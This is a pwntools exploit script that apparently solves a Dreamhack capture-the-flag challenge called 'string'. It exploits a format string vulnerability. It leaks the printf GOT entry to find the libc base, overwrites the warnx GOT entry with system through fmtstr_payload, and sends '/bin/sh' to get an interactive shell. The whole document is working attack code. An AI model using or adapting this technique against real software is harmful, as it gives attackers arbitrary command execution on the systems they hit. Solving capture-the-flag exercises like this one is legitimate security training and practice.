from pwn import *

#context.log_level = "debug"

#r = remote("host3.dreamhack.games",  24119)
r = process("./string")
libc = ELF("./libc.so.6")
e = ELF("./string")

system = libc.sym['system']
printf_got = e.got['printf']

def inp(input):
    r.sendlineafter(b"> ", b'1')
    r.sendafter(b": ", input)

def p():
    r.sendlineafter(b"> ", b'2')


#libc base
payload = p32(printf_got)
payload += b"%x%x%x%x%s"

inp(payload)
p()

lb = u32(r.recvuntil(b"\xf7")[-4:].ljust(4, b'\x00'))
libc_base = lb - libc.sym['printf']

print("libc base : ", hex(libc_base))

#got overwrite
system = system + libc_base
system1 = hex(system)[:6]
system2 = hex(system)[6:]

print("system : ", hex(system))

fsb = fmtstr_payload(5, {e.got['warnx'] : (libc.sym['system'] + libc_base)})

# fsb = p32(e.got['warnx'])
# fsb += p32(e.got['warnx'] + 2)
# fsb += "%{}c%5$hn".format(int(system2, 16)-4).encode()
# fsb += "%{}c%6$hn".format(int(system1, 16)-int(system2, 16)).encode()

inp(fsb) #got overwrite
p()
pause()
inp(b"/bin/sh" + b"\x00")
p()

r.interactive()
